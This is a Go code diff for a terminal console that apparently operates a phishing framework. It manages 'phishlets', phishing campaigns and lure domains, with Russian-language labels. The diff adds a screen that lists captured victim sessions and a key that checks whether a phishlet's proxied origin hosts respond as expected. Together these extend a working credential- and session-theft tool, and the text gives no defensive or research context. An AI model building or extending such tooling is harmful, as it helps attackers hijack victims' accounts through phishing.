@@ -45,6 +45,7 @@ const (
 	sDomainAdd
 	sCampNew
 	sCamps
+	sCaptures
 	sResult
 )
 
@@ -93,6 +94,7 @@ func initialModel(c *Client) model {
 		item{"Campaigns", "рассылки и статистика", sCamps},
 		item{"Campaign+", "новая: цели -> launch -> send", sCampNew},
 		item{"Domains", "пресеты доменов", sDomains},
+		item{"Captures", "последние захваты", sCaptures},
 		item{"Quit", "выход (сервер продолжает работать)", sMenu},
 	}
 	delegate := list.NewDefaultDelegate()
@@ -197,6 +199,23 @@ func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 			switch km.String() {
 			case "d":
 				return m.openDomainPick(m.pickPhishlet)
+			case "c":
+				hc, err := m.client.CheckPhishlet(m.pickPhishlet)
+				if err != nil {
+					return m.showResult("check: " + err.Error(), true), nil
+				}
+				var b strings.Builder
+				for _, h := range hc {
+					if h.Err != "" {
+						fmt.Fprintf(&b, "%s  ERR %s\n", h.Host, h.Err)
+						continue
+					}
+					fmt.Fprintf(&b, "%s  %d %db  hit=%d miss=%d\n", h.Host, h.HTTP, h.Bytes, len(h.Hits), len(h.Misses))
+					for _, miss := range h.Misses {
+						fmt.Fprintf(&b, "    ! %s\n", miss)
+					}
+				}
+				return m.showResult(strings.TrimRight(b.String(), "\n"), false), nil
 			case "t":
 				on := !m.pickEnabled
 				if err := m.client.SetPhishlet(m.pickPhishlet, nil, &on); err != nil {
@@ -489,6 +508,19 @@ func (m model) onEnter() (tea.Model, tea.Cmd) {
 				return m.showResult("phishlets: " + err.Error(), true), nil
 			}
 			return m.openPick("phishlet -> on/off", "phish-toggle", items), nil
+		case sCaptures:
+			caps, err := m.client.Captures()
+			if err != nil {
+				return m.showResult("captures: " + err.Error(), true), nil
+			}
+			if len(caps) == 0 {
+				return m.showResult("захватов пока нет", false), nil
+			}
+			var b strings.Builder
+			for _, cp := range caps {
+				fmt.Fprintf(&b, "%s  %s  %s\n", short(cp.Session), cp.Kind, cp.Node)
+			}
+			return m.showResult(strings.TrimRight(b.String(), "\n"), false), nil
 		case sCamps:
 			list, err := m.client.ListCampaigns()
 			if err != nil {
@@ -614,6 +646,13 @@ func (m model) showResult(s string, isErr bool) model {
 	return m
 }
 
+func short(s string) string {
+	if len(s) > 8 {
+		return s[:8]
+	}
+	return s
+}
+
 func splitCSV(s string) []string {
 	var out []string
 	for _, p := range strings.Split(s, ",") {
@@ -659,7 +698,7 @@ func (m model) View() string {
 		}
 		info := "фишлет  " + m.pickPhishlet + "\nстатус  " + state
 		return m.header() + boxStyle.Render(info) +
-			footStyle.Render("\nd — сменить домен · t — вкл/выкл · esc — назад")
+			footStyle.Render("\nd — сменить домен · t — вкл/выкл · c — проверить origin · esc — назад")
 	case sResult:
 		st := okStyle.Render("✓ OK")
 		if m.isErr {
